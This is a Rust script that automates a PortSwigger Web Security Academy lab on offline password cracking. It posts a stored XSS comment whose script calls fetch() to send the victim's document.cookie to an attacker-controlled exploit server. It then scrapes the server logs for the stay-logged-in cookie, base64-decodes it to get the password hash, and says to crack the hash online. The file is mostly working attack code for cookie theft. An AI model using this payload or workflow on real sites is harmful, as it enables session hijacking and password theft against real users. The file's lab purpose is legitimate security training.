/****************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 30/8/2023
*
* Lab: Offline password cracking
*
* Steps: 1. Exploit XSS vulnerability in comment functionlity
*        2. Extract victim cookie from the exploit server logs
*        3. Decode the cookie to get the hashed password
*        4. Crack the hash to get the plain password
*
*****************************************************************/
#![allow(unused)]
#![feature(ascii_char)]
/***********
* Imports
***********/
use base64::{self, Engine};
use lazy_static::lazy_static;
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    hash::Hash,
    io::{self, Write},
    ops::Add,
    rc::Rc,
    sync::{
        atomic::{AtomicUsize, Ordering},
        Mutex,
    },
    thread,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    let url = "https://0a07001904dedc7b83692d2900f80018.web-security-academy.net"; // change this url to your lab
    let exploit_server_url = "https://exploit-0af0009f0492dc0a83172cf1019f000a.exploit-server.net"; // change this url to your exploit server
    let client = build_client(); // build the client which will be used in all subsequent requests

    let start_time = time::Instant::now(); // capture the time before enumeration

    let is_exloited = exploit_xss_in_comment_functionality(&client, url, exploit_server_url); // put an XSS payload in the comment
    if is_exloited {
        // if you injected XSS successfully
        let cookie = extract_cookie_from_logs(&client, exploit_server_url); // try to extract the cookie from the your server logs
        if let Some(encrypt) = cookie {
            // if you found the cookie
            let decrypted = decode_cookie(encrypt); // decrypt the cookie
            let hash = decrypted.split(":").nth(1).unwrap(); // get the hash and exclude the name
            println!(
                "{}: {}",
                "✅ Password hash".yellow().bold(),
                hash.green().bold()
            );
            println!(
                "{}",
                "Crack this hash using any online hash cracker"
                    .white()
                    .bold()
            );
        } else {
            println!("{}", "No cookies found")
        }
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/******************************************************
* Function used to inject XSS in comment functionality
*******************************************************/
fn exploit_xss_in_comment_functionality(
    client: &Client,
    url: &str,
    exploit_server_url: &str,
) -> bool {
    let exploit_xss =   client.post(&format!("{url}/post/comment")).form(&HashMap::from(
       [ ("postId", "2"),
        ("comment",
        &format!("<script>fetch('{exploit_server_url}/exploit?cookie=' + document.cookie)</script/> Exploited!")
         ),
        ("name", "Hacker"),
        ("email", "hacker@hacker.me"),
        ("website", "")]
    )).send();
    if let Ok(res) = exploit_xss {
        println!(
            "{}",
            "1. Exploit XSS in comment functionality.. ☑️".white().bold()
        );
        true
    } else {
        false
    }
}

/*****************************************************************
* Function used to extract the cookie from the exploit sever logs
******************************************************************/
fn extract_cookie_from_logs(client: &Client, exploit_server_url: &str) -> Option<String> {
    let pattern = Regex::new("stay-logged-in=(.*) HTTP").unwrap();
    let logs = client.get(format!("{exploit_server_url}/log")).send();
    if let Ok(res) = logs {
        let body = res.text().unwrap();
        let cookie = pattern.captures(&body);
        if let Some(text) = cookie {
            let encrypt = text.get(1).unwrap().as_str().to_string();
            println!(
                "{}",
                "2. Get stay-logged-in cookie of the victim from exploit sever logs.. ☑️"
                    .white()
                    .bold()
            );
            return Some(encrypt);
        } else {
            None
        }
    } else {
        println!("{}", "[!] Failed to get logs through exception");
        None
    }
}

/**********************************************
* Function used to decode the extracted cookie
***********************************************/
fn decode_cookie(cookie: String) -> String {
    println!("{}", "3. Decoding the encrypted cookie.. ☑️".white().bold());
    base64::engine::general_purpose::STANDARD_NO_PAD
        .decode(cookie)
        .unwrap()
        .as_ascii()
        .unwrap()
        .as_str()
        .to_string()
}
